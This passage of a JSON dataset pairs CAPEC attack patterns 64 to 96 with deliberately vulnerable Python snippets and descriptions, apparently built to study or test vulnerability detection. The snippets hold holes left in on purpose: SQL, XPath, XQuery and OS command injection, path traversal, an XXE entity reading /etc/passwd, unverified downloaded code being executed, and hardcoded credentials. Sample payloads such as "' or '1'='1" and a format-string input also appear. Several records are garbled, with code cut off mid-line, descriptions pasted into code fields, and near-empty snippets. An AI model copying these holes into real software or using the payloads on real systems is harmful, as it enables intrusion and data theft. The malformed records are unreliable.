        "capec_name": "Using Slashes and URL Encoding Combined to Bypass Validation Logic",
        "code_snippet": "def download_file(request):\n    requested_file = request.GET.get('file', '')\n    base_dir = '/var/www/files/'\n    \n    # Vulnerable: No proper URL decoding validation\n    file_path = base_dir + requested_file\n    \n    # Vulnerable: Direct string concatenation without path validation\n    try:\n        with open(file_path, 'rb') as f:\n            data = f.read()\n            return send_file(data, requested_file)\n    except:\n        return 'File not found'",
        "description": "This code is vulnerable to URL encoding attacks and path traversal. It accepts a file parameter from GET request without properly validating URL encoded characters. An attacker can use encoded sequences like %2e%2e%2f (../), %252e%252e%252f (double-encoded ../), or other encoded variants to traverse directories and access files outside the intended directory. The code also lacks proper input validation and path sanitization, allowing for directory traversal attacks through URL encoded characters."
    },
    {
        "capec_id": "65",
        "capec_name": "Sniff Application Code",
        "code_snippet": "def update_client_software():\n    try:\n        # Download client update from server without encryption or verification\n        update_url = 'http://example.com/client/update.exe'\n        response = requests.get(update_url)\n        \n        # Store sensitive configuration in cleartext\n        config = {\n            'api_key': 'sk_live_12345abcdef',\n            'admin_password': 'supersecret123',\n            'db_credentials': 'dbuser:dbpass'\n        }\n        \n        # Write update and config to disk without verification\n        with open('client_update.exe', 'wb') as f:\n            f.write(response.content)\n        \n        with open('config.txt', 'w') as f:\n            f.write(str(config))\n        \n        # Execute downloaded update\n        subprocess.run(['client_update.exe'])\n        \n    except Exception as e:\n        print(f'Update failed: {e}')",
        "description": "This vulnerable code downloads a client software update over HTTP (not HTTPS), stores sensitive configuration data in cleartext, and executes the downloaded code without any integrity checks or verification. It demonstrates multiple security issues including cleartext transmission, missing encryption of sensitive data, and execution of unverified downloaded code."
    },
    {
        "capec_id": "66",
        "capec_name": "SQL Injection",
        "code_snippet": "\"\"\"\nimport sqlite3\n\ndef search_users(user_input):\n    conn = sqlite3.connect('users.db')\n    cursor = conn.cursor()\n    \n    # Vulnerable SQL query construction\n    query = \"SELECT * FROM users WHERE username = '\" + user_input + \"'\"\n    \n    try:\n        cursor.execute(query)\n        results = cursor.fetchall()\n        \n        # Exposing error details\n        if not results:\n            raise Exception(f\"Query failed: {query",
        "description": "\"This vulnerable code demonstrates SQL injection through direct string concatenation in query construction, improper input validation, error message exposure containing sensitive information, and a dangling cursor issue. The code accepts user input and directly incorporates it into an SQL query without sanitization, allowing potential SQL injection attacks. It also exposes detailed error messages and fails to properly close the database cursor.\""
    },
    {
        "capec_id": "67",
        "capec_name": "String Format Overflow in syslog()",
        "code_snippet": "\"\"\"\nimport syslog\n\ndef log_user_activity(user_input):\n    # Vulnerable: Using unvalidated user input directly in syslog format string\n    syslog.syslog(user_input)\n    \ndef process_log_message(message, buffer_size=256):\n    # Vulnerable: No size validation before copying\n    output_buffer = bytearray(buffer_size)\n    input_data = message.encode()\n    \n    # Vulnerable: No bounds checking\n    for i in range(len(input_data)):\n        output_buffer[i] = input_data[i]\n    \n    log_user_activity('User activity: %s' % output_buffer.decode())\n\n# Example usage with potential malicious input\nuser_data = '%x %x %x %s %n'\nprocess_log_message(user_data)\n\"\"\",\n    \"description\": \"This code demonstrates vulnerable use of syslog() by directly passing user-controlled input as a format string parameter, combined with unsafe buffer operations. It allows format string injection and buffer overflow through unchecked buffer copying and lack of input validation.\"",
        "description": "\"This code demonstrates vulnerable use of syslog() by directly passing user-controlled input as a format string parameter, combined with unsafe buffer operations. It allows format string injection and buffer overflow through unchecked buffer copying and lack of input validation.\""
    },
    {
        "capec_id": "68",
        "capec_name": "Subvert Code-signing Facilities",
        "code_snippet": "import hashlib\nimport base64\n\ndef verify_code_signature(code_file, signature):\n    # Weak hash function (MD5) used for code signing\n    hasher = hashlib.md5()\n    \n    with open(code_file, 'rb') as f:\n        code = f.read()\n        hasher.update(code)\n    \n    # Missing key verification step\n    computed_hash = base64.b64encode(hasher.digest())\n    \n    # Direct comparison without timing-safe comparison\n    if computed_hash == signature:\n        # Skip secure boot verification\n        return True\n    \n    return False\n\ndef load_and_execute(code_file):\n    if verify_code_signature(code_file, b'fake_signature'):\n        # Bypass security checks and execute potentially malicious code\n        with open(code_file, 'rb') as f:\n            exec(f.read())",
        "description": "This code demonstrates multiple security vulnerabilities in a code signing implementation: it uses a weak hash function (MD5), skips critical cryptographic steps like proper key verification, lacks secure boot verification, and allows arbitrary code execution. The signature verification can be easily bypassed due to weak comparison and missing security controls."
    },
    {
        "capec_id": "69",
        "capec_name": "Target Programs with Elevated Privileges",
        "code_snippet": "import os\nimport subprocess\n\ndef backup_system(user_input):\n    # Run as root for 'enhanced' functionality\n    os.setuid(0)\n    \n    # Allow user to specify backup directory\n    backup_dir = user_input\n    \n    # Construct backup command from user input without sanitization\n    backup_cmd = f'tar -czf /backup/{backup_dir}.tar.gz {backup_dir}'\n    \n    # Execute command with shell=True\n    subprocess.run(backup_cmd, shell=True)\n    \n    # Load untrusted library for compression\n    lib_path = f'/tmp/{backup_dir}_compress.so'\n    if os.path.exists(lib_path):\n        from ctypes import CDLL\n        CDLL(lib_path)",
        "description": "A vulnerable backup utility that runs with root privileges, accepts unsanitized user input for command execution, and loads potentially malicious libraries. It demonstrates unnecessary privilege elevation, external control of system settings, unsafe command execution, and potential for OS command injection."
    },
    {
        "capec_id": "70",
        "capec_name": "Try Common or Default Usernames and Passwords",
        "code_snippet": "class UserAuth:\n    def __init__(self):\n        self.users = {\n            'admin': 'admin123',\n            'system': 'password',\n            'root': '',\n            'user': 'default'\n        }\n\n    def authenticate(self, username, password):\n        if username in self.users:\n            if password == self.users[username]:\n                return True\n        return False\n\n    def add_user(self, username, password):\n        # No password complexity requirements\n        # No password expiration\n        # Single factor authentication only\n        self.users[username] = password\n\ndef main():\n    auth = UserAuth()\n    username = input('Username: ')\n    password = input('Password: ')\n    if auth.authenticate(username, password):\n        print('Access granted')\n    else:\n        print('Access denied')",
        "description": "This vulnerable code demonstrates multiple authentication weaknesses including hardcoded default credentials, weak password policy (no complexity requirements), single-factor authentication, and no password aging mechanism. The system stores passwords in plaintext and allows empty or common passwords, making it susceptible to default credential attacks and password guessing."
    },
    {
        "capec_id": "71",
        "capec_name": "Using Unicode Encoding to Bypass Validation Logic",
        "code_snippet": "\"\"\"\ndef validate_user_input(user_input):\n    # Simple blacklist for dangerous characters\n    blacklist = ['<', '>', '&', '\"']\n    \n    # Incorrect order: validate before decode/canonicalize\n    if any(char in user_input for char in blacklist):\n        return False\n        \n    # Decode after validation, allowing bypass\n    decoded_input = user_input.encode('utf-8').decode('unicode-escape')\n    \n    # Process the input without proper unicode handling\n    username = decoded_input.lower()\n    \n    # Store in database without proper encoding\n    db_query = f\"INSERT INTO users (name) VALUES ('{username",
        "description": "\"This code demonstrates multiple Unicode-related vulnerabilities. It performs validation before decoding, allowing attackers to bypass security checks using Unicode escape sequences. It also implements an incomplete blacklist and fails to properly handle Unicode encoding throughout the process. The code is vulnerable to injection attacks through Unicode character manipulation.\""
    },
    {
        "capec_id": "72",
        "capec_name": "URL Encoding",
        "code_snippet": "\"\"\"\ndef process_url_file(user_url):\n    # Directly use user-provided URL without validation\n    import urllib.request\n    import os\n\n    # Decode URL without checking for malicious encoding\n    decoded_url = urllib.parse.unquote(user_url)\n    \n    # Extract filename from URL without sanitization\n    filename = decoded_url.split('/')[-1]\n    \n    # Directly use the filename in file operations\n    with open(filename, 'w') as f:\n        response = urllib.request.urlopen(decoded_url)\n        f.write(response.read().decode('utf-8'))\n        \n    # Execute commands using the file\n    os.system('process_file ' + filename)\n\"\"\",\n    \"description\": \"This vulnerable code accepts a URL without proper validation, fails to handle alternate URL encodings safely, and uses unsanitized user input in file operations and command execution. It's susceptible to path traversal and command injection through specially crafted URLs with encoded characters.\"",
        "description": "\"This vulnerable code accepts a URL without proper validation, fails to handle alternate URL encodings safely, and uses unsanitized user input in file operations and command execution. It's susceptible to path traversal and command injection through specially crafted URLs with encoded characters.\""
    },
    {
        "capec_id": "73",
        "capec_name": "User-Controlled Filename",
        "code_snippet": "def save_uploaded_file(filename, content):\n    # Unsanitized user input directly used in filename\n    upload_path = f'uploads/{filename}'\n    \n    # No validation of file content or name\n    with open(upload_path, 'w') as f:\n        f.write(content)\n    \n    # Vulnerable HTML generation using user input\n    html_output = f'''\n    <html>\n        <body>\n            <h1>File uploaded successfully!</h1>\n            <a href=\"{upload_path}\">{filename}</a>\n            <img src=\"{upload_path}\" alt=\"{filename}\">\n        </body>\n    </html>\n    '''\n    \n    return html_output",
        "description": "This code demonstrates a vulnerable file upload system that fails to properly validate and sanitize user input in filenames. It directly embeds user-provided filenames into HTML output without proper encoding, allowing for XSS attacks through malicious filenames. The code also lacks proper input validation, file type checking, and output encoding, making it susceptible to directory traversal and code injection attacks."
    },
    {
        "capec_id": "74",
        "capec_name": "Manipulating State",
        "code_snippet": "class BankAccount:\n    def __init__(self):\n        self.balance = 0\n        self.authenticated = False\n        self.state = 'INIT'\n        \n    def login(self, cookie):\n        # CWE-315: Stores sensitive auth data in cleartext cookie\n        self.auth_token = cookie\n        self.authenticated = True\n        self.state = 'LOGGED_IN'\n    \n    def transfer_money(self, amount, destination):\n        # CWE-372: Incomplete state checking\n        # No verification if state is actually LOGGED_IN\n        # No integrity check on amount (CWE-353)\n        if self.authenticated:\n            # State can be manipulated to bypass balance check\n            if self.state == 'PREMIUM_USER':\n                self.balance -= amount\n                return True\n            elif self.balance >= amount:\n                self.balance -= amount\n                return True\n        return False\n    \n    def reset(self):\n        # CWE-1271: Security state not properly initialized on reset\n        pass  # Authentication state remains unchanged after reset",
        "description": "This code demonstrates multiple state management vulnerabilities in a banking system. It fails to properly validate state transitions, stores sensitive data in cleartext, lacks integrity checks, and has improper state initialization on reset. The authentication state can be manipulated, and the premium user state can be exploited to bypass balance checks."
    },
    {
        "capec_id": "75",
        "capec_name": "Manipulating Writeable Configuration Files",
        "code_snippet": "def process_config_file(config_path):\n    config = {}\n    with open(config_path, 'r') as f:\n        for line in f:\n            if '=' in line:\n                key, value = line.strip().split('=')\n                if 'command' in value:\n                    # Directly executes commands from config without validation\n                    os.system(value)\n                config[key] = value\n    return config\n\ndef update_config(repo_url):\n    # Pulls configuration from external repository without validation\n    os.system(f'git clone {repo_url} /tmp/config')\n    # Loads and processes the config without verifying source or integrity\n    config = process_config_file('/tmp/config/app.conf')\n    return config",
        "description": "This vulnerable code demonstrates handling of configuration files without proper validation or security controls. It accepts and executes commands from configuration files without sanitization, pulls configurations from external sources without origin validation, and processes configuration data without integrity checks. The code directly executes system commands from config values and clones repositories without verifying authenticity, making it susceptible to command injection and unauthorized configuration modifications."
    },
    {
        "capec_id": "76",
        "capec_name": "Manipulating Web Input to File System Calls",
        "code_snippet": "def process_user_file(user_input):\n    base_dir = '/var/www/uploads/'\n    filename = user_input.strip()\n    \n    # Vulnerable: No path traversal checks\n    file_path = os.path.join(base_dir, filename)\n    \n    # Vulnerable: No validation of file path\n    with open(file_path, 'r') as file:\n        content = file.read()\n    \n    # Vulnerable: Command injection possibility\n    os.system(f'process_file {file_path}')\n    \n    # Vulnerable: File operations with elevated privileges\n    os.chmod(file_path, 0o777)\n    \n    return content",
        "description": "This code demonstrates multiple file system vulnerabilities including path traversal, command injection, and improper file access control. It allows unfiltered user input to directly influence file system operations and command execution. An attacker could use '../' sequences to access files outside the intended directory or inject malicious commands through the filename parameter."
    },
    {
        "capec_id": "77",
        "capec_name": "Manipulating User-Controlled Variables",
        "code_snippet": "\"\"\"\n# Flask web application with vulnerable configuration handling\nfrom flask import Flask, request\n\napp = Flask(__name__)\napp.config = {",
        "description": "\"This vulnerable code demonstrates multiple security issues: external control of system configuration (CWE-15), code injection through eval (CWE-94), improper authorization (CWE-285), and authentication bypass through user-controlled parameters (CWE-302). The application allows direct modification of configuration settings through user input, executes arbitrary code through eval(), and implements a weak authentication mechanism that can be easily bypassed.\""
    },
    {
        "capec_id": "78",
        "capec_name": "Using Escaped Slashes in Alternate Encoding",
        "code_snippet": "def process_filepath(user_input):\n    # Directly processes user input without proper validation or encoding checks\n    if user_input.startswith('\\\\'):\n        # Attempts to handle backslash but does it incorrectly\n        user_input = user_input[1:]\n    \n    # Vulnerable path handling without proper canonicalization\n    filepath = 'C:\\\\users\\\\' + user_input\n    \n    try:\n        with open(filepath, 'r') as file:\n            return file.read()\n    except:\n        return 'Error accessing file'\n\n# Example usage that could be exploited\n# process_filepath('..\\\\..\\\\sensitive_file.txt')\n# process_filepath('\\\\..\\\\windows\\\\system32\\\\config')",
        "description": "This code is vulnerable to path traversal and alternate encoding attacks through backslash manipulation. It fails to properly validate or canonicalize input before processing, doesn't handle special characters correctly, and allows directory traversal through backslash-prefixed paths. The code directly concatenates user input into file paths without proper sanitization, enabling attackers to access unauthorized files through path manipulation and escape sequences."
    },
    {
        "capec_id": "79",
        "capec_name": "Using Slashes in Alternate Encoding",
        "code_snippet": "\"\"\"\ndef process_file_path(user_input):\n    # Vulnerable file path processing\n    file_path = user_input.replace('\\\\\\\\', '/')\n    \n    # Only checks for forward slashes, not backslashes\n    if '../' in file_path:\n        return None\n    \n    base_dir = '/var/www/files/'\n    try:\n        with open(base_dir + file_path, 'r') as file:\n            return file.read()\n    except:\n        return None\n        \ndef main():\n    user_path = input('Enter file path: ')\n    content = process_file_path(user_path)\n    if content:\n        print(content)\n\"\"\",\n    \"description\": \"This vulnerable code processes file paths without properly handling alternate encoding of slash characters. It only validates for '../' sequences but fails to account for backslash variants, allowing path traversal attacks. The code also performs validation before canonicalization and lacks proper input sanitization, making it susceptible to directory traversal attacks using various slash combinations.\"",
        "description": "\"This vulnerable code processes file paths without properly handling alternate encoding of slash characters. It only validates for '../' sequences but fails to account for backslash variants, allowing path traversal attacks. The code also performs validation before canonicalization and lacks proper input sanitization, making it susceptible to directory traversal attacks using various slash combinations.\""
    },
    {
        "capec_id": "80",
        "capec_name": "Using UTF-8 Encoding to Bypass Validation Logic",
        "code_snippet": "def validate_filename(user_input):\n    # Vulnerable: validates before decoding UTF-8\n    if not user_input.isalnum():\n        return False\n    \n    # Decode after validation, potentially allowing malicious UTF-8 sequences\n    decoded_input = user_input.encode('utf-8').decode('utf-8', errors='ignore')\n    \n    # Process file operation with potentially malicious input\n    filepath = f'/var/www/uploads/{decoded_input}'\n    with open(filepath, 'w') as f:\n        f.write('content')\n    \n    return True\n\n# Example usage\ndef process_user_request(filename):\n    # Attacker can use overlong UTF-8 encoding to bypass validation\n    # For example: using ％2E％2E／ (UTF-8 encoded ../) for directory traversal\n    if validate_filename(filename):\n        print(f'File processed: {filename}')\n    else:\n        print('Invalid filename')",
        "description": "This vulnerable code demonstrates improper handling of UTF-8 encoded input by validating the input before decoding it, allowing attackers to bypass security checks using alternate UTF-8 encodings. The code also shows unsafe file operations with user-controlled input, potentially enabling directory traversal attacks through specially crafted UTF-8 sequences."
    },
    {
        "capec_id": "81",
        "capec_name": "Web Server Logs Tampering",
        "code_snippet": "\"\"\"\nimport logging\nimport os\n\nclass InsecureLogger:\n    def __init__(self):\n        self.log_file = 'web_server.log'\n        logging.basicConfig(filename=self.log_file, level=logging.INFO)\n        os.chmod(self.log_file, 0o666)  # Vulnerable permissions\n\n    def log_user_activity(self, user_input):\n        # Vulnerable: No input validation or sanitization\n        user_data = user_input.replace('\\\\n', '\\\\n')  # Ineffective CRLF filtering\n        \n        # Vulnerable: Direct user input in log message\n        logging.info(f'User activity: {user_data",
        "description": "\"This code demonstrates a vulnerable logging implementation that allows log tampering through multiple vectors: insufficient input sanitization, improper CRLF handling, weak file permissions, and direct user input logging. The code allows injection of control characters, log directives, and malicious content into log files, making it susceptible to log tampering attacks.\""
    },
    {
        "capec_id": "82",
        "capec_name": "DEPRECATED: Violating Implicit Assumptions Regarding XML Content (aka XML Denial of Service (XDoS))",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef process_xml_input(xml_data):\n    try:\n        # Vulnerable: Missing XML validation and entity reference restrictions\n        tree = ET.fromstring(xml_data)\n        \n        # Process user-supplied XPath query without sanitization\n        user_xpath = input('Enter XPath query: ')\n        results = tree.findall(user_xpath)\n        \n        # Vulnerable: Processing XML with external entities enabled\n        for result in results:\n            print(result.text)\n        \n        return results\n    except Exception as e:\n        return str(e)\n\n# Example usage with dangerous XML containing external entities\nxml_input = '''<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root>\n    <data>&xxe;</data>\n    <data>test</data>\n</root>'''\n\nprocess_xml_input(xml_input)",
        "description": "This vulnerable code demonstrates multiple XML-related security issues including: processing XML without schema validation, allowing external entity references, potential XML entity expansion attacks, and accepting unsanitized XPath queries. The code processes XML input without proper validation or entity restrictions, making it susceptible to XXE attacks, XML injection, and entity expansion attacks."
    },
    {
        "capec_id": "83",
        "capec_name": "XPath Injection",
        "code_snippet": "def authenticate_user(username, password):\n    xml_data = '''\n    <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n    <users>\n        <user>\n            <username>admin</username>\n            <password>admin123</password>\n        </user>\n        <user>\n            <username>user1</username>\n            <password>pass123</password>\n        </user>\n    </users>'''\n\n    from xml.etree import ElementTree as ET\n    root = ET.fromstring(xml_data)\n    \n    # Vulnerable XPath query construction\n    xpath_query = f\"//user[username='{username}' and password='{password}']\"\n    result = root.findall(xpath_query)\n    \n    return len(result) > 0",
        "description": "This code demonstrates a vulnerable XPath injection by directly embedding user input into an XPath query without sanitization. An attacker could input specially crafted values like \"' or '1'='1\" for both username and password to bypass authentication. The code constructs the XPath query by direct string concatenation, making it susceptible to injection attacks that could manipulate the query's logic or extract unauthorized data from the XML database."
    },
    {
        "capec_id": "84",
        "capec_name": "XQuery Injection",
        "code_snippet": "from lxml import etree\nfrom io import StringIO\n\ndef search_user_xml(user_input):\n    xml_data = '''\n    <users>\n        <user>\n            <id>1</id>\n            <username>admin</username>\n            <password>admin123</password>\n        </user>\n        <user>\n            <id>2</id>\n            <username>user</username>\n            <password>user123</password>\n        </user>\n    </users>'''\n    \n    xml_doc = etree.parse(StringIO(xml_data))\n    query = f\"for $user in /users/user where $user/username = '{user_input}' return $user/password/text()\"\n    result = xml_doc.xpath(query)\n    return result\n\n# Usage\nusername = \"' or '1'='1\"\npasswords = search_user_xml(username)",
        "description": "This code demonstrates a vulnerable XQuery/XPath injection scenario where user input is directly concatenated into an XML query string without proper sanitization. An attacker can inject malicious queries (like \"' or '1'='1\") to bypass authentication or extract unauthorized data from the XML database. The code processes XML data containing user credentials and allows arbitrary query manipulation through unvalidated user input."
    },
    {
        "capec_id": "85",
        "capec_name": "AJAX Footprinting",
        "code_snippet": "\"\"\"\nimport requests\nimport json\nfrom concurrent.futures import ThreadPoolExecutor\n\nclass AjaxScanner:\n    def __init__(self, target_url):\n        self.target_url = target_url\n        self.results = {",
        "description": "\"This code demonstrates a vulnerable AJAX scanner that performs rapid concurrent requests to test for multiple vulnerabilities including XSS, HTTP Header Injection, and path traversal. It lacks proper input validation, output encoding, and uses unsafe practices like disabling SSL verification. The scanner sends malicious payloads and checks for their reflection in responses, enabling fingerprinting and vulnerability discovery.\""
    },
    {
        "capec_id": "86",
        "capec_name": "XSS Through HTTP Headers",
        "code_snippet": "from flask import Flask, request, make_response\n\ndef create_html_response(user_input):\n    # Vulnerable header handling\n    response = make_response(f\"<h1>Welcome {user_input}</h1>\")\n    user_agent = request.headers.get('User-Agent')\n    referer = request.args.get('referer', '')\n    \n    # Vulnerable: directly embedding unvalidated input in headers\n    response.headers['X-Custom-Header'] = referer\n    response.headers['X-User-Data'] = user_input\n    \n    # Vulnerable: unescaped user input in HTML content\n    content = f\"<html><body>\\\n        <img src='{user_input}'>\\\n        <div>{user_agent}</div>\\\n        </body></html>\"\n    \n    response.data = content\n    return response\n\napp = Flask(__name__)\n\n@app.route('/vulnerable')\ndef vulnerable_page():\n    user_input = request.args.get('input', '')\n    return create_html_response(user_input)",
        "description": "This code demonstrates multiple XSS vulnerabilities through unvalidated input handling in HTTP headers and HTML content. It accepts user input and unsafely embeds it in custom HTTP headers, image tags, and HTML content without proper sanitization. The code is vulnerable to XSS attacks through HTTP headers (CWE-644), IMG tag attributes (CWE-82), and general HTML content (CWE-79, CWE-80)."
    },
    {
        "capec_id": "87",
        "capec_name": "Forceful Browsing",
        "code_snippet": "from flask import Flask, redirect, request\n\napp = Flask(__name__)\n\nusers = {\n    'admin': {'role': 'admin', 'balance': 10000},\n    'user': {'role': 'user', 'balance': 100}\n}\n\n@app.route('/account/<username>')\ndef view_account(username):\n    # No authentication check, direct URL access possible\n    if username in users:\n        return f\"Balance for {username}: ${users[username]['balance']}\"\n\n@app.route('/admin/panel')\ndef admin_panel():\n    # No proper authorization, only relies on URL knowledge\n    return \"Welcome to admin panel. Full access granted.\"\n\n@app.route('/transfer')\ndef transfer_money():\n    # Sensitive data in GET parameters\n    amount = request.args.get('amount')\n    from_user = request.args.get('from')\n    to_user = request.args.get('to')\n    \n    if from_user in users and to_user in users:\n        users[to_user]['balance'] += int(amount)\n        users[from_user]['balance'] -= int(amount)\n        return 'Transfer complete'",
        "description": "This vulnerable code demonstrates forced browsing by lacking proper authentication and authorization checks. It allows direct URL access to sensitive endpoints like account information and admin panel. It also exposes sensitive operations through GET parameters and fails to implement proper access controls, making it susceptible to unauthorized access through direct URL manipulation."
    },
    {
        "capec_id": "88",
        "capec_name": "OS Command Injection",
        "code_snippet": "def process_user_file(filename):\n    user_input = input('Enter command to process file: ')\n    command = f'file {filename} && {user_input}'\n    os.system(command)",
        "description": "The code allows a user to input a command to process a file, but directly concatenates the user input into a shell command without any validation or sanitization. An attacker can inject malicious commands using shell metacharacters (like ; | && >), allowing arbitrary command execution. The vulnerability stems from trusting user input and using it directly in os.system()."
    },
    {
        "capec_id": "89",
        "capec_name": "Pharming",
        "code_snippet": "from flask import Flask, redirect, request\nimport socket\n\napp = Flask(__name__)\n\nTRUSTED_BANKS = {\n    'legitbank.com': '10.0.0.1',\n    'securetrade.com': '10.0.0.2'\n}\n\ndef verify_domain(hostname):\n    try:\n        ip_addr = socket.gethostbyname(hostname)\n        resolved_host = socket.gethostbyaddr(ip_addr)[0]  # Vulnerable reverse DNS lookup\n        return resolved_host in TRUSTED_BANKS\n    except:\n        return False\n\n@app.route('/bank_redirect')\ndef bank_redirect():\n    target_bank = request.args.get('bank_domain')\n    \n    if verify_domain(target_bank):  # Insufficient origin validation\n        return redirect(f'http://{target_bank}/login')  # No SSL verification\n    \n    # Client-side security check\n    return f\"<script>if(confirm('Access {target_bank}?')) window.location='{target_bank}';</script>\"\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This vulnerable code demonstrates a pharming attack scenario where a banking redirect service fails to properly validate domains and relies on insecure DNS resolution. It contains multiple vulnerabilities: improper origin validation, unsafe reverse DNS lookup, client-side security enforcement, and potential for XSS through unvalidated redirect URLs. The code also lacks SSL verification and integrity checks for redirects."
    },
    {
        "capec_id": "90",
        "capec_name": "Reflection Attack in Authentication Protocol",
        "code_snippet": "\"\"\"\nimport socket\nimport hashlib\n\nclass AuthServer:\n    def __init__(self):\n        self.secret = b'secretkey123'\n        \n    def authenticate_client(self, connection):\n        # Generate and send challenge\n        challenge = b'random_challenge'\n        connection.send(challenge)\n        \n        # Receive response\n        response = connection.recv(1024)\n        \n        # Vulnerable verification - subject to reflection attack\n        expected = hashlib.md5(challenge + self.secret).hexdigest()\n        if response.decode() == expected:\n            return True\n        return False\n\nclass VulnerableClient:\n    def __init__(self):\n        self.secret = b'secretkey123'\n        \n    def login(self, server_socket):\n        # Receive challenge\n        challenge = server_socket.recv(1024)\n        \n        # Generate response using same format as server\n        response = hashlib.md5(challenge + self.secret).hexdigest()\n        server_socket.send(response.encode())\n\n# Malicious client can capture challenge and replay it\nclass MaliciousClient:\n    def perform_reflection_attack(self, server):\n        # Capture legitimate challenge\n        challenge = server.recv(1024)\n        \n        # Reflect challenge back as both challenge and response\n        server.send(challenge)\n        response = server.recv(1024)\n        server.send(response)\n\"\"\",\n    \"description\": \"This code demonstrates a vulnerable authentication protocol implementation that is susceptible to reflection attacks. The server uses a challenge-response mechanism but fails to implement proper protections against reflection. The authentication can be bypassed by capturing and replaying messages, allowing an attacker to authenticate without knowing the secret key. The vulnerability stems from using the same challenge-response format in both directions and not implementing measures like unique session identifiers or direction indicators in the protocol.\"",
        "description": "\"This code demonstrates a vulnerable authentication protocol implementation that is susceptible to reflection attacks. The server uses a challenge-response mechanism but fails to implement proper protections against reflection. The authentication can be bypassed by capturing and replaying messages, allowing an attacker to authenticate without knowing the secret key. The vulnerability stems from using the same challenge-response format in both directions and not implementing measures like unique session identifiers or direction indicators in the protocol.\""
    },
    {
        "capec_id": "91",
        "capec_name": "DEPRECATED: XSS in IMG Tags",
        "code_snippet": "\"\"\"\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/display-image')\ndef display_image():\n    # Vulnerable handling of user input for image URL\n    image_url = request.args.get('url', '')\n    \n    # Inadequate sanitization of image tag attributes\n    template = '''\n    <html>\n        <body>\n            <img src=\"%s\" />\n        </body>\n    </html>\n    ''' % image_url\n\n    return render_template_string(template)\n\"\"\",\n    \"description\": \"The code demonstrates a vulnerable web application that accepts an image URL parameter and directly embeds it into an HTML IMG tag without proper sanitization. This allows attackers to inject malicious JavaScript through the src attribute or other IMG tag attributes, enabling XSS attacks using various syntax variations including doubled characters and alternate script syntax.\"",
        "description": "\"The code demonstrates a vulnerable web application that accepts an image URL parameter and directly embeds it into an HTML IMG tag without proper sanitization. This allows attackers to inject malicious JavaScript through the src attribute or other IMG tag attributes, enabling XSS attacks using various syntax variations including doubled characters and alternate script syntax.\""
    },
    {
        "capec_id": "92",
        "capec_name": "Forced Integer Overflow",
        "code_snippet": "def allocate_and_copy(user_input_size):\n    # Convert user input to integer\n    size = int(user_input_size)\n    \n    # Vulnerable: No size validation\n    buffer_size = size * 4  # Could overflow\n    \n    # Allocate memory based on calculated size\n    buffer = bytearray(buffer_size)\n    \n    # Copy data without bounds checking\n    user_data = b'A' * (size * 8)  # Potentially larger than buffer\n    for i in range(len(user_data)):\n        try:\n            buffer[i] = user_data[i]\n        except IndexError:\n            pass\n    \n    return buffer\n\n# Example usage with large value that could cause overflow\nresult = allocate_and_copy(1073741824)  # 2^30",
        "description": "This code demonstrates multiple integer-related vulnerabilities. It performs an unchecked multiplication that could cause integer overflow, allocates memory based on the potentially overflowed value, and attempts to copy data without proper bounds checking. The function accepts a user-controlled size parameter, multiplies it without validation, and uses it for memory allocation, potentially leading to heap buffer overflow due to integer wraparound. The code also shows unsafe data copying that could write beyond the allocated buffer's bounds."
    },
    {
        "capec_id": "93",
        "capec_name": "Log Injection-Tampering-Forging",
        "code_snippet": "def log_user_activity(user_input, log_file='system.log'):\n    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')\n    sensitive_data = {'password': '123456', 'api_key': 'abc123'}\n    \n    # Log user activity without sanitization\n    user_log = f'{timestamp} - User activity: {user_input}'\n    with open(log_file, 'a') as f:\n        f.write(user_log + '\\n')\n        # Excessive logging of sensitive data\n        f.write(f'Context: {sensitive_data}\\n')\n    \n    # Attempt to read logs\n    with open(log_file, 'r') as f:\n        logs = f.readlines()\n    return logs\n\n# Example usage with malicious input\nmalicious_input = 'normal_activity\\n\\rDELETE * FROM users;--\\nAdmin: Success'",
        "description": "This vulnerable code demonstrates multiple logging-related security issues. It accepts unsanitized user input and writes it directly to log files, allowing for log injection and manipulation through newlines and control characters. It also logs sensitive information (passwords and API keys) and performs excessive logging. The code allows any user to read the logs, potentially exposing sensitive data and manipulated log entries. An attacker could inject malicious entries to cover their tracks or mislead auditors."
    },
    {
        "capec_id": "94",
        "capec_name": "Adversary in the Middle (AiTM)",
        "code_snippet": "import socket\nimport ssl\n\ndef create_ssl_server():\n    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)\n    context.load_cert_chain('server.crt', 'server.key')\n    \n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.bind(('localhost', 8443))\n    sock.listen(5)\n    \n    while True:\n        conn, addr = sock.accept()\n        ssl_conn = context.wrap_socket(conn, server_side=True)\n        \n        # Vulnerable: Modifying SSL context after connection is established\n        context.verify_mode = ssl.CERT_NONE\n        \n        # Vulnerable: No proper authentication check\n        data = ssl_conn.recv(1024)\n        if b'token' in data:\n            ssl_conn.send(b'SECRET_DATA')\n        \n        ssl_conn.close()\n\nif __name__ == '__main__':\n    create_ssl_server()",
        "description": "This code demonstrates multiple vulnerabilities in SSL/TLS implementation, including modifying SSL context after connection creation (CWE-593), insufficient authentication (CWE-287), and potential for replay attacks (CWE-294). The server accepts connections without proper endpoint verification and uses a basic token check that could be easily captured and replayed. The SSL context is modified after connection establishment, potentially compromising the security of subsequent connections."
    },
    {
        "capec_id": "95",
        "capec_name": "WSDL Scanning",
        "code_snippet": "\"\"\"\nfrom flask import Flask, render_template, request\nimport xml.etree.ElementTree as ET\n\napp = Flask(__name__)\n\n# Database credentials exposed in WSDL\nDB_USER = 'admin'\nDB_PASS = 'secret123'\n\ndef generate_wsdl():\n    wsdl = f'''<?xml version=\"1.0\"?>\n    <definitions>\n        <service name=\"BankingService\">\n            <documentation>Internal Banking API</documentation>\n            <port name=\"BankingPort\">\n                <address location=\"http://internal.bank.com/api\"/>\n                <connection>\n                    <database user=\"{DB_USER",
        "description": "\"This vulnerable code exposes sensitive information through a WSDL file, including database credentials, internal API endpoints, and private methods. It uses GET requests with sensitive parameters and places the WSDL in a publicly accessible endpoint. The code demonstrates multiple vulnerabilities including exposure of sensitive system information, improper access control, and unsafe exposure of service details through WSDL.\""
    },
    {
        "capec_id": "96",
        "capec_name": "Block Access to Libraries",
